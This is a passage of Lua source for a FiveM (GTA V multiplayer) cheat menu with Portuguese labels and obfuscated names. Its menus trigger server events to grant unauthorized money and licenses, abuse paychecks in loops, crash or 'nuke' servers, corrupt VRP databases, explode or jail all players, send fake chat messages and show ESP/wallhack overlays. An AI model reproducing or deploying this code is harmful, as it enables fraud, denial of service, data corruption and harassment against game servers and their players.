                    oldmodaction = Pryorbypessed2
                    oldprim,oldsec = GetVehicleColours(veh)
                    oldpearl,oldwheelcolour = GetVehicleExtraColours(veh)
                    oldmod = table.pack(oldprim,oldsec,oldpearl,oldwheelcolour)
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)

                    isPreviewing = Pryorbypessed3
                  elseif isPreviewing and currims == thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = Pryorbypessed2
                    oldmodtype = -1
                    oldmod = -1
                  elseif isPreviewing and currims ~= thePaint.id then
                    SetVehicleExtraColours(veh, oldpearl,thePaint.id)
                    isPreviewing = Pryorbypessed3
                  end
                end
              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(VMS) then
              drawDescription("Modificações do Veiculo!  :)", 0.58, 0.58)
              if felipebypassedmesquita.MenuButton("~p~#~s~ ~o~L~b~S ~y~Tunagens", LSCC) then
		elseif felipebypassedmesquita.button("~y~Carro de Controle ~g~(NEW) ") then
				Pryorbypessed5 = Pryorbypessed8("Digita o Nome do Carro :", "", 1000000)
				Citizen.CreateThread(function()		   
					Pryorbypessed6.Start()
				end)     
      elseif felipebypassedmesquita.button("~g~Carro de Controle v2 CAM/C ~r~(NEW)") then
        RcModel = kbinput("Nome do Carro :", "", 20)
              if RcModel and IsModelValid(RcModel) and IsModelAVehicle(RcModel) then
        xlpcarmodtt.Start()
            else
              notify("~r~Error:~w~ modelo Invalido! ")
            end       
                  elseif felipebypassedmesquita.CheckBox("~y~Pular Carro / Espaço ~g~(NEW)", JumpMod, function(enabled) JumpMod = enabled end) then
              
              elseif felipebypassedmesquita.MenuButton("~p~#~s~ Setar MOTOR ~g~Do Veiculo", bmm) then
              elseif felipebypassedmesquita.MenuButton("~p~#~s~ Veiculo List NAME", CTSa) then
              elseif felipebypassedmesquita.MenuButton("~p~#~s~ ~r~Trollar ~o~Todos os ~y~CARROS", gccccc) then
              elseif felipebypassedmesquita.MenuButton("~p~-->~r~ Opção CRASHADA. Não Clique/erro CODE", MTS) then
              elseif felipebypassedmesquita.button("~r~S~b~p~g~a~o~w~y~n~p~a~s~r ~r~Veiculo ~s~Por NOME") then
   				spawnvehicle()
		elseif felipebypassedmesquita.button("~b~Comprar Veiculo ~g~(NEW/~r~RISCO)") then fv()
   
		elseif felipebypassedmesquita.button("~y~Destrancar Veiculo ~g~(NEW)") then
		      local closestVeh = GetClosestVehicle()
                if not DoesEntityExist(closestVeh) then 
                end
                local veh = GetVehiclePedIsUsing(PlayerPedId())
                SetVehicleDoorsLockedForAllPlayers(veh, Pryorbypessed2)
                SetVehicleDoorsLockedForPlayer(veh, PlayerId(), Pryorbypessed2)
                SetVehicleDoorsLocked(veh, Pryorbypessed2)

              elseif felipebypassedmesquita.button("~r~Deletar ~s~Veiculo") then
                DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
              elseif felipebypassedmesquita.button("~g~Reparar ~s~Veiculo") then
                repairvehicle()
              elseif felipebypassedmesquita.button("~g~Reparar ~s~Motor") then
                repairengine()
              
              elseif felipebypassedmesquita.button("~g~Desvirar ~p~o Veiculo") then
                daojosdinpatpemata()
              elseif felipebypassedmesquita.button("~b~Tunar No ~s~Máximo") then
                MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
              elseif felipebypassedmesquita.CheckBox("Veiculo modo Godmode", VehGod, function(enabled) VehGod = enabled end)then
              elseif felipebypassedmesquita.CheckBox("~b~Veiculo a ~y~Prova de A'Água", waterp, function(enabled) waterp = enabled end) then
              elseif felipebypassedmesquita.CheckBox("Speedboost ~g~SHIFT ~r~CTRL", VehSpeed, function(enabled) VehSpeed = enabled end) then
              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(gccccc) then
              if felipebypassedmesquita.CheckBox("~y~Fumaçar ~b~Veiculo Próximos ~g~(SAFE)", destroyvehicles, function(enabled) destroyvehicles = enabled end) then
              elseif felipebypassedmesquita.CheckBox("~Y~Deletar~s~ ~b~Veiculos Próximos ~g~(SAFE)", deletenearestvehicle, function(enabled) deletenearestvehicle = enabled end) then
			  elseif felipebypassedmesquita.CheckBox("~y~Lançar Todos os ~b~Carros para o ALTO ~g~(SAFE)", lolcars, function(enabled) lolcars = enabled end) then
        elseif felipebypassedmesquita.CheckBox("~y~Rodar ~b~Todos os Carros ~g~(NEW) ~g~(SAFE)", lolcarsww, function(enabled) lolcarsww = enabled end) then
        elseif felipebypassedmesquita.CheckBox("~y~Lançar  ~b~Todos os Carros para Baixo ~g~(NEW) ~g~(SAFE)", lolcarszz, function(enabled) lolcarszz = enabled end) then
        elseif felipebypassedmesquita.CheckBox("~y~Lançar  ~b~Todos os Carros para o Lado ~g~(NEW) ~g~(SAFE)", lolcarsaa, function(enabled) lolcarsaa = enabled end) then
              elseif felipebypassedmesquita.CheckBox("~y~Desparar~b~ Alarme de Veiculos Próximos ~g~(SAFE)", alarmvehicles, function(enabled) alarmvehicles = enabled end) then
              elseif felipebypassedmesquita.CheckBox("~y~Fazer~b~ Todos os Carros dar um FLIP ~g~(SAFE)", lolcarsbb, function(enabled) lolcarsbb = enabled end) then
              elseif felipebypassedmesquita.CheckBox("~y~Explodir~b~ Todos os Veiculos Próximos ~r~(RISCO)", explodevehicles, function(enabled) explodevehicles = enabled end) then
              elseif felipebypassedmesquita.CheckBox("~y~Estragar~b~ Todos os Veiculos Próximos ~g~(SAFE)", fuckallcars, function(enabled) fuckallcars = enabled end) then
              elseif felipebypassedmesquita.button("~y~Setar ~b~Placa Dos Veiculos Proximos") then
                local plateInput = Pryyyorbypass("Digite a Placa" , "", 100000000)
                      for k in EnumerateVehicles() do
                        RequestControlOnce(k)
                        SetVehicleNumberPlateText(k, plateInput)
                      end
              end
              --------------------------
              --LUA MENUS
              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(LMX) then
              drawDescription("All handy LUA triggers", 0.46, 0.46)
              if felipebypassedmesquita.MenuButton("~p~#~s~ ~r~ESX ~s~Dinheiro", esms) then
              elseif felipebypassedmesquita.MenuButton("~p~#~s~ ~r~ESX ~s~Misc", ESXC) then
              elseif felipebypassedmesquita.MenuButton("~p~#~s~ ~r~ESX ~s~Drogas", ESXD) then
              elseif felipebypassedmesquita.MenuButton("~p~#~s~ ~y~VRP ~s~Triggers", VRPT) then
              elseif felipebypassedmesquita.MenuButton("~p~#~s~ ~b~Misc ~s~Triggers", MSTC) then
              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(esms) then
               if felipebypassedmesquita.button("~o~!!!!!  ~r~NãO TESTADO !") then
                Pryorbypessed1('esx_cichyprzystanek:kasa', -3423943)
				Pryorbypessed1('esx_dmvschool:pay', -3000000)
				Pryorbypessed1("esx_gopostaljob:pay", -300000, securityToken)
				Pryorbypessed1("esx_lscustom:buyMod", -303030)
				Pryorbypessed1('sendChatMessageDistress', "Hejka")
				Pryorbypessed1('esx_policejob:message',  GetPlayerServerId(i), '~r~Kolorek | MONEY MENU  <3')
				Pryorbypessed1("tablet_lscm:SendMessage", GetPlayerServerId(i), math.random(999999,99999999),  '~r~Kolorek | MONEY MENU <3')
              elseif felipebypassedmesquita.button("~g~ESX ~y~NÃO TESTADO") then
                Pryorbypessed1('esx_policejob:message',  GetPlayerServerId(i), '~r~Kolorek| MONEY MENU  <3')
				Pryorbypessed1("tablet_lscm:SendMessage", GetPlayerServerId(i), math.random(999999,99999999),  '~r~Kolorek | MONEY MENU <3')
				Pryorbypessed1("tostzdrapka:wygranko", securityToken)
              elseif felipebypassedmesquita.CheckBox("~y~Pagamento~g~ Policial", huntspam, function(enabled) huntspam = enabled end) then
			  Pryorbypessed1('esx_policejob:message',  GetPlayerServerId(i), '~r~JEBAC SKAZE | MONEY MENU  <3')
				Pryorbypessed1("tablet_lscm:SendMessage", GetPlayerServerId(i), math.random(999999,99999999),  '~r~JEBACSKAZE | MONEY MENU <3')
				Pryorbypessed1("tostzdrapka:wygranko", securityToken)
              elseif felipebypassedmesquita.button("~g~ESX ~y~Pagamento Policial ~p~v2") then
                Pryorbypessed1("esx_garbage:pay", -3000009)
				Pryorbypessed1("esx_dirtyjob:pay", -300000)
				Pryorbypessed1('esx_policejob:message',  GetPlayerServerId(i), '~r~Kochac ariesa | MONEY MENU kolorek <3')
				Pryorbypessed1("tablet_lscm:SendMessage", GetPlayerServerId(i), math.random(999999,99999999),  '~r~Aries <3 | MONEY MENU <3')
              elseif felipebypassedmesquita.button("~g~ESX ~y~Pagamento ~p~MotoBoy x100") then
			  Pryorbypessed1('esx_dmvschool:pay', -3000000)
				Pryorbypessed1('magazynier:zaplac', 3553500)
				Pryorbypessed1('esx_policejob:message',  GetPlayerServerId(i), '~r~https://xaries.pl | MONEY MENU  <3')
				Pryorbypessed1("tablet_lscm:SendMessage", GetPlayerServerId(i), math.random(999999,99999999),  '~r~https://xaries.pl | MONEY MENU <3')
              elseif felipebypassedmesquita.button("~g~ESX ~y~Desmanche ~p~Dinheiro SUJO") then
                local result = Pryyyorbypass("Digite o Valor :", "", 100)
                if result ~= "" then
                  TSE("esx_carthief:pay", result)
                end
              elseif felipebypassedmesquita.button("~g~ESX ~y~Pagamento, ~p~Caminhoneiro") then
                local result = Pryyyorbypass("Digite o Valor :", "", 100)
                if result ~= "" then
                  TSE("esx_truckerjob:pay", result)
                end
              elseif felipebypassedmesquita.button("~g~ESX ~y~Fazer ADMIN Depositar no seu Banco") then
                local result = Pryyyorbypass("Digite o Valor :", "", 100)
                if result ~= "" then
                  TSE("AdminMenu:giveBank", result)
                end
              elseif felipebypassedmesquita.button("~g~ESX ~y~Fazer ADMIN te dar Dinheiro") then
                local result = Pryyyorbypass("Digite o Valor :", "", 100)
                if result ~= "" then
                  TSE("AdminMenu:giveCash", result)
                end
              elseif felipebypassedmesquita.button("~g~ESX ~y~Postal Job") then
                local result = Pryyyorbypass("Digite o Valor :", "", 100)
                if result ~= "" then
                  TSE("esx_gopostaljob:pay", result)
                end
              elseif felipebypassedmesquita.button("~g~ESX ~y~Sacar dinheiro ~r~(RISCO)") then
                local result = Pryyyorbypass("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("esx_banksecurity:pay", result)
                end
              elseif felipebypassedmesquita.button("~g~ESX ~y~Não CLIQUE") then
                local result = Pryyyorbypass("Digite o Valor :", "", 100)
                if result ~= "" then
                  TSE("esx_slotmachine:sv:2", result)
                end
              end



              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(ESXC) then
              drawDescription("ESX Triggers for thirst/hunger/dmv etc", 0.42, 0.42)
              if felipebypassedmesquita.button("~w~Set hunger to ~g~100") then
                TriggerEvent("esx_status:set", "hunger", 1000000)
              elseif felipebypassedmesquita.button("~w~Set thirst to ~g~100") then
                TriggerEvent("esx_status:set", "thirst", 1000000)
              elseif felipebypassedmesquita.button("Get Driving License") then
                TSE("esx_dmvschool:addLicense", 'dmv')
                TSE("esx_dmvschool:addLicense", 'drive')
              elseif felipebypassedmesquita.button("~b~Buy ~s~a vehicle for ~g~free") then
                matacumparamasini()
              end


              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(ESXD) then
              drawDescription("ESX Triggers for drugs", 0.58, 0.58)
              if felipebypassedmesquita.button("~g~Harvest ~g~Weed") then
                hweed()
              elseif felipebypassedmesquita.button("~g~Transform ~g~Weed") then
                tweed()
              elseif felipebypassedmesquita.button("~g~Sell ~g~Weed") then
                sweed()
              elseif felipebypassedmesquita.button("~w~Harvest ~w~Coke") then
                hcoke()
              elseif felipebypassedmesquita.button("~w~Transform ~w~Coke") then
                tcoke()
              elseif felipebypassedmesquita.button("~w~Sell ~w~Coke") then
                scoke()
              elseif felipebypassedmesquita.button("~r~Harvest Meth") then
                hmeth()
              elseif felipebypassedmesquita.button("~r~Transform Meth") then
                tmeth()
              elseif felipebypassedmesquita.button("~r~Sell Meth") then
                smeth()
              elseif felipebypassedmesquita.button("~p~Harvest Opium") then
                hopi()
              elseif felipebypassedmesquita.button("~p~Transform Opium") then
                topi()
              elseif felipebypassedmesquita.button("~p~Sell Opium") then
                sopi()
              elseif felipebypassedmesquita.button("~g~Money Wash") then
                mataaspalarufe()
              elseif felipebypassedmesquita.button("~r~Stop all") then
                matanumaispalarufe()
              elseif felipebypassedmesquita.CheckBox("~r~Blow Drugs Up ~y~DANGER!",BlowDrugsUp,function(enabled)BlowDrugsUp = enabled end) then
              end


              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(VRPT) then
              drawDescription("Basic VRP Triggers", 0.42, 0.42)
              if felipebypassedmesquita.button("~r~VRP ~s~Give Money ~ypayGarage") then
                local result = Pryyyorbypass("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("lscustoms:payGarage", {costs = -result})
                end
              elseif felipebypassedmesquita.button("~r~VRP ~g~PayCheck Abuse") then
                local v = Pryyyorbypass("How many times?", "", 100)
                if v ~= "" then
                  for i = 0,v do
                    TSE('paychecks:bonus')
                    TSE('paycheck:bonus')
                  end
                else
                  notify("~b~Invalid amount~s~.", Pryorbypessed2)
                end
              elseif felipebypassedmesquita.button("~r~VRP ~g~SalaryPay Abuse","You need a job!") then
                local v = Pryyyorbypass("How many times?", "", 100)
                if v ~= "" then
                  for i = 0,v do
                    TSE('paychecks:salary')
                    TSE('paycheck:salary')
                  end
                else
                  notify("~b~Invalid amount~s~.", Pryorbypessed2)
                end
              elseif felipebypassedmesquita.button("~r~VRP ~g~WIN ~s~Slot Machine") then
                local result = Pryyyorbypass("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("vrp_slotmachine:server:2",result)
                end
              elseif felipebypassedmesquita.button("~r~VRP ~s~Get driving license") then
                TSE("dmv:success")
              elseif felipebypassedmesquita.button("~r~VRP ~s~Bank Deposit") then
                local result = Pryyyorbypass("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("Banca:deposit", result)
                  TSE("bank:deposit", result)
                end
              elseif felipebypassedmesquita.button("~r~VRP ~s~Bank Withdraw ") then
                local result = Pryyyorbypass("Enter amount of money", "", 100)
                if result ~= "" then
                  TSE("bank:withdraw", result)
                  TSE("Banca:withdraw", result)
                end
              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(MSTC) then
              drawDescription("Fun triggers to play with", 0.30, 0.30)
              if felipebypassedmesquita.button("Send Fake Message") then
                local pname = Pryyyorbypass("Enter player name", "", 100)
                if pname then
                  local message = Pryyyorbypass("Enter message", "", 1000)
                  if message then
                    TSE("_chat:messageEntered", pname, { 0, 0x99, 255 }, message)
                  end
                end
              end

              felipebypassedmesquita.Display()
            elseif felipebypassedmesquita.IsMenuOpened(advm) then
              if felipebypassedmesquita.MenuButton("~p~#~s~ Destruir Servidor", dddd) then
              elseif felipebypassedmesquita.MenuButton("~p~#~s~ Wall HACK Options", espa) then
              elseif felipebypassedmesquita.CheckBox("Blips dos PLAYER", bBlips, function(bBlips) end) then
                showblip = not showblip
                bBlips = showblip
              elseif felipebypassedmesquita.CheckBox("~y~Forçar MiniMAPA ~g~(ADICIONADO)", ForceRadar, function(enable) ForceRadar = enable end) then 
              elseif felipebypassedmesquita.CheckBox("NOME DOS JOGADORES", nameabove, function(enabled) nameabove = enabled end) then
			  elseif felipebypassedmesquita.CheckBox("~y~Jesus~s~Mode", dio, function(enabled) dio = enabled end) then
              elseif felipebypassedmesquita.ComboBox("~y~Jesus~s~Mode Fov", JesusRadiusOps, currJesusRadiusIndex, selJesusRadiusIndex, function(currentIndex, selectedIndex)
                currJesusRadiusIndex = currentIndex
                selJesusRadiusIndex = currentIndex
                JesusRadius = JesusRadiusOps[currentIndex]
				end) then
                elseif felipebypassedmesquita.CheckBox("~y~Modo ~g~Magneto", magnet, function(enabled) MagnetoBoy() end) then
                end

                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(CMSMS) then
                drawDescription("Crosshairs modifications", 0.29, 0.29)
                if felipebypassedmesquita.CheckBox("~y~Original ~s~Crosshair", crosshair, function (enabled) crosshair = enabled crosshairc = Pryorbypessed2 crosshairc2 = Pryorbypessed2 end) then
                elseif felipebypassedmesquita.CheckBox("~r~CROSS ~s~Crosshair", crosshairc, function (enabled) crosshair = Pryorbypessed2 crosshairc = enabled crosshairc2 = Pryorbypessed2 end) then
                elseif felipebypassedmesquita.CheckBox("~r~DOT ~s~Crosshair", crosshairc2, function (enabled) crosshair = Pryorbypessed2 crosshairc = Pryorbypessed2 crosshairc2 = enabled end) then
                end

                felipebypassedmesquita.Display()
			  elseif felipebypassedmesquita.IsMenuOpened(GAPA) then
                if felipebypassedmesquita.button("~r~Prender~s~ Todos os ~y~Jogadores") then
                  jailall()
                elseif felipebypassedmesquita.button("~r~Prop ~p~BANANA~s~ em Todos os ~y~Jogadores") then
                  bananapartyall()
                elseif felipebypassedmesquita.button("~r~Prender2~s~ Todos os ~y~Jogadores") then
                  cageall()
                elseif felipebypassedmesquita.button("~r~BORGAR~s~ Todos os ~y~Jogadores") then
                  borgarall()
                elseif felipebypassedmesquita.button("~r~Explodir~s~ Todos os ~y~Jogadores") then
                  explodeall()
                elseif felipebypassedmesquita.button("~r~Dar ARMA~s~ Para ~y~Todos") then
                weaponsall()
                elseif felipebypassedmesquita.CheckBox( "~r~Algemar~s~ Todos os ~y~Jogadores", freezeall, function(enabled) freezeall = enabled end) then
				        elseif felipebypassedmesquita.CheckBox( "~r~Desativar~s~ Todos os Carros", cardz, function(enabled) cardz = enabled end) then
				        elseif felipebypassedmesquita.CheckBox( "~r~Desativar~s~ Todos as ARMAS", gundz, function(enabled) gundz = enabled end) then
                end

                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(dddd) then
                if felipebypassedmesquita.button("~r~Bomba ~y~Nuclear") then
                  nukeserver()
                elseif felipebypassedmesquita.CheckBox( "~r~Crashar ~s~Server ~y~em Silencio", servercrasherxd, function(enabled) servercrasherxd = enabled end) then
                elseif felipebypassedmesquita.button("~g~ESX ~r~Destroyer ~r~v3") then
				  	esxdestroyv3()
                elseif felipebypassedmesquita.button("~g~VRP ~r~Destroyer ~r~V1") then
					vrpdestroy()
				elseif felipebypassedmesquita.CheckBox( "~g~VRP ~r~Bugar ~p~DataBASE", vrpdbc, function(enabled) vrpdbc = enabled end) then
        elseif felipebypassedmesquita.CheckBox( "~g~GCPhone ~r~Destroyer", gcphonedestroy, function(enabled) gcphonedestroy = enabled end) then
        elseif felipebypassedmesquita.button("~r~Rampinator LOL") then
          for vehicle in EnumerateVehicles() do
            local ramp = CreateObject(-145066854, 0, 0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
            NetworkRequestControlOfEntity(vehicle)
            AttachEntityToEntity(ramp, vehicle, 0, 0, -1.0, 0.0, 0.0, 0, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3, 1, Pryorbypessed3)
            NetworkRequestControlOfEntity(ramp)
            SetEntityAsMissionEntity(ramp, Pryorbypessed3, Pryorbypessed3)
          end
				end

                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(crds) then
              drawDescription("Se Você passou por aqui, me CHAME!", 0.46, 0.46)
              if felipebypassedmesquita.button("~r~Não CLIQUE1 ~s~:)") then
               Pryorbypessed1('InteractSound_SV:PlayWithinDistance', 10000, 'handcuff', 1.0)
			   Pryorbypessed1('InteractSound_SV:PlayWithinDistance', 10000, 'Cuff', 1.0)
			   Pryorbypessed1('InteractSound_SV:PlayWithinDistance', 10000, 'cuffs', 1.0)
			   Pryorbypessed1('InteractSound_SV:PlayWithinDistance', 10000, 'cuffseffect', 1.0)
			  elseif felipebypassedmesquita.button("~r~Não CLIQUE1 ~s~:)") then
			   Pryorbypessed1('InteractSound_SV:PlayWithinDistance', 13232, 'pasysound', 1.0)
			  elseif felipebypassedmesquita.button("~r~Não CLIQUE2 ~s~:)") then
			   Pryorbypessed1("InteractSound_SV:PlayWithinDistance", 5, "alarm", 0.5)
			  elseif felipebypassedmesquita.button("~r~Não CLIQUE3 ~s~:)") then
			   Pryorbypessed1("InteractSound_SV:PlayWithinDistance", 5, "cuff", 0.5)
			  elseif felipebypassedmesquita.button("~r~Não CLIQUE4 ~s~:)") then
			   Pryorbypessed1("InteractSound_SV:PlayWithinDistance", 103232, "lock", 1.0)
			  elseif felipebypassedmesquita.button("~r~Não CLIQUE5 ~s~:)") then
			   Pryorbypessed1("InteractSound_SV:PlayWithinDistance", 10, "szajbusek", 1)
			   
                end
				
				felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(TrollP) then
			  elseif felipebypassedmesquita.button("~g~Menu.~y~DDoBB") then

                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(WTNe) then
                drawDescription("Lista de ARMAS para Você.... :)", 0.58, 0.58)
                for k, v in pairs(l_weapons) do
                  if felipebypassedmesquita.MenuButton("~p~#~s~ "..k, WTSbull) then
                    WeaponTypeSelect = v
                  end
                end
                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(WTSbull) then
                for k, v in pairs(WeaponTypeSelect) do
                  if felipebypassedmesquita.MenuButton(v.name, WOP) then
                    WeaponSelected = v
                  end
                end
                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(WOP) then
                if felipebypassedmesquita.button("~r~Spawn Weapon") then
                  GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 1000, Pryorbypessed2)
                end
                if felipebypassedmesquita.button("~g~Add Ammo") then
                  SetPedAmmo(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), 5000)
                end
                if felipebypassedmesquita.CheckBox("~r~Infinite ~s~Ammo", WeaponSelected.bInfAmmo, function(s)
                end) then
                  WeaponSelected.bInfAmmo = not WeaponSelected.bInfAmmo
                  SetPedInfiniteAmmo(GetPlayerPed(-1), WeaponSelected.bInfAmmo, GetHashKey(WeaponSelected.id))
                  SetPedInfiniteAmmoClip(GetPlayerPed(-1), Pryorbypessed3)
                  PedSkipNextReloading(GetPlayerPed(-1))
                  SetPedShootRate(GetPlayerPed(-1), 1000)
                end
                for k, v in pairs(WeaponSelected.mods) do
                  if felipebypassedmesquita.MenuButton("~p~#~s~ ~r~> ~s~"..k, MSMSA) then
                    ModSelected = v
                  end
                end
                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(MSMSA) then
                for _, v in pairs(ModSelected) do
                  if felipebypassedmesquita.button(v.name) then
                    GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(WeaponSelected.id), GetHashKey(v.id));
                  end
                end

                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(CTSa) then
                drawDescription("Spawn a car in front of you", 0.58, 0.58)
                for i, aName in ipairs(CarTypes) do
                  if felipebypassedmesquita.MenuButton("~p~#~s~ "..aName, CTS) then
                    carTypeIdx = i
                  end
                end
                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(CTS) then
                for i, aName in ipairs(CarsArray[carTypeIdx]) do
                  if felipebypassedmesquita.MenuButton("~p~#~s~ ~r~>~s~ "..aName, cAoP) then
                    carToSpawn = i
                  end
                end
                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(cAoP) then
                if felipebypassedmesquita.CheckBox("~g~Spawn inside", spawninside, function(enabled) spawninside = enabled end) then
                elseif felipebypassedmesquita.button("~r~Spawn Car") then
                  local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                  local veh = CarsArray[carTypeIdx][carToSpawn]
                  if veh == Pryorbypessed then
                    veh = "adder"
                  end
                  vehiclehash = GetHashKey(veh)
                  RequestModel(vehiclehash)

                  Citizen.CreateThread(function()
                  local waiting = 0
                  while not HasModelLoaded(vehiclehash) do
                    waiting = waiting + 100
                    Citizen.Wait(100)
                    if waiting > 5000 then
                      ShowNotification("~r~Não pode Spawnar este Veiculo!")
                      break
                    end
                  end
                  SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
                  SetVehicleStrong(SpawnedCar, Pryorbypessed3)
                  SetVehicleEngineOn(SpawnedCar, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
                  SetVehicleEngineCanDegrade(SpawnedCar, Pryorbypessed2)
                  if spawninside then
                    SetPedIntoVehicle(PlayerPedId(-1), SpawnedCar, -1)
                  end
                  end)
                end

                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(MTS) then
                drawDescription("Be in a car/truck, then spawn any trailer", 0.58, 0.58)
                if IsPedInAnyVehicle(GetPlayerPed(-1), Pryorbypessed3) then
                  for i, aName in ipairs(Trailers) do
                    if felipebypassedmesquita.MenuButton("~p~#~s~ ~r~>~s~ "..aName, CTSmtsps) then
                      TrailerToSpawn = i
                    end
                  end
                else
                  notify("~w~Não esta em um Veiculo!", Pryorbypessed3)
                end
                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(CTSmtsps) then
                if felipebypassedmesquita.button("~r~Spawn Car") then
                  local x,y,z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                  local veh = Trailers[TrailerToSpawn]
                  if veh == Pryorbypessed then veh = "adder" end
                  vehiclehash = GetHashKey(veh)
                  RequestModel(vehiclehash)

                  Citizen.CreateThread(function()
                  local waiting = 0
                  while not HasModelLoaded(vehiclehash) do
                    waiting = waiting + 100
                    Citizen.Wait(100)
                    if waiting > 5000 then
                      ShowNotification("~r~Não Pode Spawnar o Veiculo!")
                      break
                    end
                  end
                  local SpawnedCar = CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1))+90, 1, 0)
                  local UserCar = GetVehiclePedIsUsing(GetPlayerPed(-1))
                  AttachVehicleToTrailer(Usercar, SpawnedCar, 50.0)
                  SetVehicleStrong(SpawnedCar, Pryorbypessed3)
                  SetVehicleEngineOn(SpawnedCar, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
                  SetVehicleEngineCanDegrade(SpawnedCar, Pryorbypessed2)
                  end)
                end

                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(GSWP) then
                drawDescription("Weapon list to give to the player", 0.58, 0.58)
                for i = 1, #allWeapons do
                  if felipebypassedmesquita.button(allWeapons[i]) then
                    GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(allWeapons[i]), 1000, Pryorbypessed2, Pryorbypessed3)
                  end
                end

                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(espa) then
                drawDescription("Extra Sensory Perception menu", 0.34, 0.34)
                if felipebypassedmesquita.CheckBox("~r~ESP ~s~Nomes", esp, function(enabled) esp = enabled end) then
		elseif felipebypassedmesquita.CheckBox("~r~Forçar ~s~Minimapa ~g~(NEW)", showMinimap, function(enabled) showMinimap = enabled end) then 
                elseif felipebypassedmesquita.CheckBox("~r~ESP ~s~Box", espbox, function(enabled) espbox = enabled end) then
                elseif felipebypassedmesquita.CheckBox("~r~ESP ~s~Mostrar ARMADO", espinfo, function(enabled) espinfo = enabled end) then
                elseif felipebypassedmesquita.CheckBox("~r~ESP ~s~Linhas", esplines, function(enabled) esplines = enabled end) then
                end

                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(LSCC) then
                drawDescription("Apply some cool stuff to your car", 0.46, 0.46)
                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if felipebypassedmesquita.MenuButton("~p~#~s~ ~r~Exterior ~s~Tuning", tngns) then
                elseif felipebypassedmesquita.MenuButton("~p~#~s~ ~r~Performance ~s~Tuning", prof) then
                elseif felipebypassedmesquita.button("~b~Mudar a Placa do Carro") then
                  carlicenseplaterino()
                elseif felipebypassedmesquita.CheckBox("~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Cor Veiculo/Mudando", RainbowVeh, function(enabled) RainbowVeh = enabled end) then
                elseif felipebypassedmesquita.button("Setar Veiculo ~y~Sujo") then
                  Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif felipebypassedmesquita.button("Seta Veiculo ~g~Limpo") then
                  Clean2(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif felipebypassedmesquita.CheckBox("~g~R~r~a~y~i~b~n~o~b~r~o~g~w ~s~Neons & Headlights", rainbowh, function(enabled) rainbowh = enabled end) then
                end


                felipebypassedmesquita.Display()
              elseif felipebypassedmesquita.IsMenuOpened(bmm) then
                drawDescription("Power Boost para Seu carro!", 0.46, 0.46)
                if felipebypassedmesquita.ComboBox("Engine ~r~Power ~s~Booster", powerboost, currentItemIndex, selectedItemIndex, function(currentIndex, selectedIndex)
                currentItemIndex = currentIndex
                selectedItemIndex = selectedIndex
                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2), selectedItemIndex * 20.0)
                end) then

                elseif felipebypassedmesquita.CheckBox("Engine ~g~Torque ~s~Booster ~g~2x", t2x, function(enabled)
                  t2x = enabled
                  t4x = Pryorbypessed2
                  t10x = Pryorbypessed2
                  t16x = Pryorbypessed2
                  txd = Pryorbypessed2
                  tbxd = Pryorbypessed2
                  end) then
                  elseif felipebypassedmesquita.CheckBox("Engine ~g~Torque ~s~Booster ~g~4x", t4x, function(enabled)
                    t2x = Pryorbypessed2
                    t4x = enabled
                    t10x = Pryorbypessed2
                    t16x = Pryorbypessed2
                    txd = Pryorbypessed2
                    tbxd = Pryorbypessed2
                    end) then
